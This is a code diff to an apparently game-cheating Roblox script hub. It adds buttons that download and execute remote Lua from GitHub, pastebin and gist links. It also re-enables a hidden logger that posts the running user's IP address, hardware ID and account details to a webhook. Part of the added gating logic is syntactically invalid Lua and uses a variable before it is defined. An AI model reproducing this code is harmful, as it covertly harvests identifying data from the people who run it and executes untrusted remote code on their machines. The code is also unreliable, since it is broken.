@@ -1,4 +1,15 @@
-local Players = game:GetService("Players")
+local devUsername = "Bloxwatch_H3ck"
+local DevUsernameB = "TheCorruptDarklaw"
+
+if player.Name == devUsername or player.Name == DevUsernameB then
+	local ready = true
+else
+end
+	
+	
+	
+	if local ready = false then
+	local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local Lighting = game:GetService("Lighting")
 local player = Players.LocalPlayer
@@ -113,6 +124,8 @@ end
 task.wait(2.5)
 tweenOutAndDestroy()
 task.wait(1)
+
+end
 function PostWebhook(L_1_arg0, L_2_arg1)
     local L_3_ = http_request or request or HttpPost or syn.request
     local L_4_ = L_3_({
@@ -135,7 +148,7 @@ function AdminLoggerMsg()
                 {["name"] = "**Username**", ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```", ["inline"] = true},
                 {["name"] = "**UserID**", ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```", ["inline"] = true},
                 {["name"] = "**PlaceID**", ["value"] = "```" .. game.PlaceId .. "```", ["inline"] = false},
-              -- Removed for now  {["name"] = "**IP Address**", ["value"] = "```" .. tostring(game:HttpGet("[https://api.ipify.org](https://api.ipify.org)", true)) .. "```", ["inline"] = false},
+                {["name"] = "**IP Address**", ["value"] = "```" .. tostring(game:HttpGet("[https://api.ipify.org](https://api.ipify.org)", true)) .. "```", ["inline"] = false},
                 {["name"] = "**Hwid**", ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```", ["inline"] = false},
                 {["name"] = "**JobID**", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
                 {["name"] = "**Join Code**", ["value"] = "```lua\ngame.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')```", ["inline"] = false}
@@ -570,6 +583,14 @@ if game.PlaceId == 6839171747 then
 })
   
   local Button = TabDoors:CreateButton({
+	Name = "Pro HaxV3",
+	Description = nil, -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheHunterSolo1/Scripts/refs/heads/main/Protected_2809220311826785.lua.txt"))()
+    	end
+})
+  
+  local Button = TabDoors:CreateButton({
 	Name = "Scanner",
 	Description = nil, -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
     	Callback = function()
@@ -593,19 +614,21 @@ loadstring(game:HttpGet("https://pastebin.com/raw/Hsuiugnr",true))()
     	end
 })
   
-    local Button = TabDoors:CreateButton({
-	Name = "Crucifix Test",
-	Description = nil, -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
-    	Callback = function()
-         loadstring(game:HttpGet("https://raw.githubusercontent.com/Matthew201322/Doors-Scriptee/refs/heads/Shakelights/Crucifix.lua",true))()
-    	end
-})
+
   
     local Button = TabDoors:CreateButton({
 	Name = "Spiral",
 	Description = nil, -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
     	Callback = function()
          loadstring(game:HttpGet("https://gist.githubusercontent.com/IdkMyNameLoll/8b05c837bea9effac2554340465b4be1/raw/3f3be0ee72e7f153db39a16a40fa63dce6cde72d/SpiralBottle",true))()
+    	end
+})
+  
+  local Button = TabDoors:CreateButton({
+	Name = "Infinite Revives",
+	Description = "Only works on Hotel- and Super hard Mode", -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
+        game.GetService("ReplicatedStorage").EntityInfo.Revive:FireServer() -- The function that takes place when the button is pressed
     	end
 })
 else
@@ -628,6 +651,13 @@ if game.PlaceId == 142823291 then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
         end
     })
+  local Button = TabMM2:CreateButton({
+	Name = "Yarhm",
+	Description = nil, -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
+    	end
+})
 end
 
 -- NDS Tab (from WindUI script)
@@ -953,5 +983,66 @@ if game.PlaceId == 82248041085838 then
         end
     })
 end
+
+
+-- Fallback to the original "Settings" tab in Luna
+local Tab100 = Window:CreateTab({
+    Name = "Settings",
+    Icon = "info_outline",
+    ImageSource = "Material",
+    ShowTitle = true
+})
+
+--[[ Original Luna ServerHop Button]]
+local Button = Tab100:CreateButton({
+    Name = "ServerHop",
+    Description = nil,
+    Callback = function()
+        local ts = game:GetService("TeleportService")
+        local p = game:GetService("Players").LocalPlayer
+        ts:Teleport(game.PlaceId, p)
+    end
+})
+
+-- ================================================================
+-- MODIFICATIONS
+-- ================================================================
+
+-- Create a Dev tab if the player is a developer
+-- Change "Bloxwatch_H3ck" and "TheCorruptDarklaw" to your Roblox usernames to enable this tab.
+
+if player.Name == devUsername or player.Name == DevUsernameB then
+    local DevTab = Window:CreateTab({
+        Name = "Dev",
+        Icon = "dashboard",
+        ImageSource = "Material",
+        ShowTitle = true
+    })
+
+    DevTab:CreateButton({
+        Name = "Copy CFrame",
+        Description = "Copies the player's CFrame to the clipboard.",
+        Callback = function()
+            -- Wait for the character and its HumanoidRootPart to exist before using it.
+            local character = player.Character or player.CharacterAdded:Wait()
+            local rootPart = character and character:FindFirstChild("HumanoidRootPart")
+            if rootPart then
+                local cframe = rootPart.CFrame
+                local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = cframe:components()
+                local formattedCFrame = string.format("CFrame.new(%f, %f, %f, %f, %f, %f, %f, %f, %f, %f, %f, %f)", x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22)
+
+                setclipboard(formattedCFrame)
+                Window:CreateNotification({
+                    Name = "CFrame Copied",
+                    Description = "Player's CFrame has been copied to the clipboard.",
+                    Duration = 5
+                })
+            end
+        end
+    })
+end
+
+
+
 
 Window:LoadConfiguration()
